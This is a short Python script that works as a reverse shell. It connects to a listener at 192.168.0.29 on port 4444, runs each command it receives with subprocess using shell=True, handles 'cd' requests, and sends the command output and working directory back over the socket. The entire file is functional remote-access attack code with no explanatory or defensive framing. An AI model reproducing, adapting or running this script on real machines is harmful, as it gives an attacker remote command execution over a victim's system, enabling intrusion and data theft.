import os
import socket
import subprocess

s = socket.socket()
host = "192.168.0.29"
port = 4444
s.connect((host, port))


while True:
    cmd = s.recv(1024)

    if cmd[:2].decode("utf-8") == "cd":
        os.chdir(cmd[3:].decode("utf-8"))
    if len(cmd) > 0:
        shell = subprocess.Popen(cmd.decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE) 
        outputBytes = shell.stdout.read() + shell.stderr.read()

        s.send(outputBytes + str.encode(os.getcwd() + ">"))

s.close()